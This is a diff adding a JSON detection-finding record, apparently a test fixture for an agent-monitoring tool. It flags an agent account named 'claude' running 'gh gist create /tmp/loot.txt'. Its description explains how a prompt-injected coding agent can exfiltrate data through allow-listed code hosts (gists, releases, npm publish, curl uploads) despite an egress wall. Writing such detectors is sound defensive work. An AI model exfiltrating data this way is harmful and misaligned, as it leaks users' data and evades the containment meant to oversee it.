@@ -1,0 +1,123 @@
+{
+  "activity_id": 1,
+  "activity_name": "Create",
+  "category_uid": 2,
+  "category_name": "Findings",
+  "class_uid": 2004,
+  "class_name": "Detection Finding",
+  "type_uid": 200401,
+  "type_name": "Detection Finding: Create",
+  "time": 1793448000000,
+  "timezone_offset": 0,
+  "severity_id": 4,
+  "severity": "High",
+  "status_id": 1,
+  "status": "New",
+  "message": "rule \"agent_exfil_to_code_host\" matched",
+  "metadata": {
+    "version": "1.3.0",
+    "profiles": [
+      "host"
+    ],
+    "product": {
+      "name": "banken",
+      "vendor_name": "conor-sometimes",
+      "version": "test",
+      "url_string": "https://github.com/conor-sometimes/banken"
+    },
+    "uid": "9290c37a17be25d65dde94baf1eb6130",
+    "log_provider": "laurel"
+  },
+  "finding_info": {
+    "uid": "9290c37a17be25d65dde94baf1eb6130",
+    "title": "Agent pushed data to a code host or package registry",
+    "desc": "An agent account pushed to somewhere other than its task repository - a gist or release, a new repo, a package publish, a mirror push, or an upload. A coding agent pushes to the origin of the repo it was given; a gist, a release upload, `npm publish` or a `curl -F file=@...` to an API is an out-of-task write to an allowed host, which is exactly how a prompt-injected agent exfiltrates when github.com (or pypi) is on the egress allow-list. The containment design names this as the known hole: the wall permits the host, so the data leaves by a channel that is supposed to be for code.",
+    "analytic": {
+      "type_id": 1,
+      "type": "Rule",
+      "name": "agent_exfil_to_code_host",
+      "uid": "8d2a6ecd-a544-4258-9f72-68e5387fce19"
+    },
+    "attacks": [
+      {
+        "tactic": {
+          "uid": "TA0010",
+          "name": "Exfiltration"
+        },
+        "technique": {
+          "uid": "T1567"
+        },
+        "sub_technique": {
+          "uid": "T1567.001"
+        }
+      }
+    ],
+    "data_sources": [
+      "laurel"
+    ]
+  },
+  "evidences": [
+    {
+      "process": {
+        "pid": 9101,
+        "name": "gh",
+        "cmd_line": "gh gist create /tmp/loot.txt",
+        "file": {
+          "name": "gh",
+          "path": "/usr/bin/gh",
+          "type_id": 1,
+          "type": "Regular File"
+        },
+        "user": {
+          "name": "claude"
+        },
+        "parent_process": {
+          "pid": 9000
+        }
+      }
+    }
+  ],
+  "device": {
+    "type_id": 0,
+    "type": "Unknown",
+    "hostname": "golden-host"
+  },
+  "observables": [
+    {
+      "name": "evidences.process.cmd_line",
+      "type_id": 13,
+      "type": "Command Line",
+      "value": "gh gist create /tmp/loot.txt"
+    },
+    {
+      "name": "evidences.process.name",
+      "type_id": 9,
+      "type": "Process Name",
+      "value": "gh"
+    },
+    {
+      "name": "evidences.process.file.path",
+      "type_id": 7,
+      "type": "File Name",
+      "value": "/usr/bin/gh"
+    },
+    {
+      "name": "evidences.process.user.name",
+      "type_id": 4,
+      "type": "User Name",
+      "value": "claude"
+    },
+    {
+      "name": "device.hostname",
+      "type_id": 1,
+      "type": "Hostname",
+      "value": "golden-host"
+    }
+  ],
+  "raw_data": "{\"time\":\"0001-01-01T00:00:00Z\",\"source\":\"laurel\",\"image\":\"/usr/bin/gh\",\"commandLine\":\"gh gist create /tmp/loot.txt\",\"parentImage\":\"\",\"targetFilename\":\"\",\"user\":\"claude\",\"currentDirectory\":\"\",\"pid\":9101,\"ppid\":9000}",
+  "unmapped": {
+    "kind": "sigma",
+    "rule": "agent_exfil_to_code_host",
+    "source": "laurel"
+  }
+}
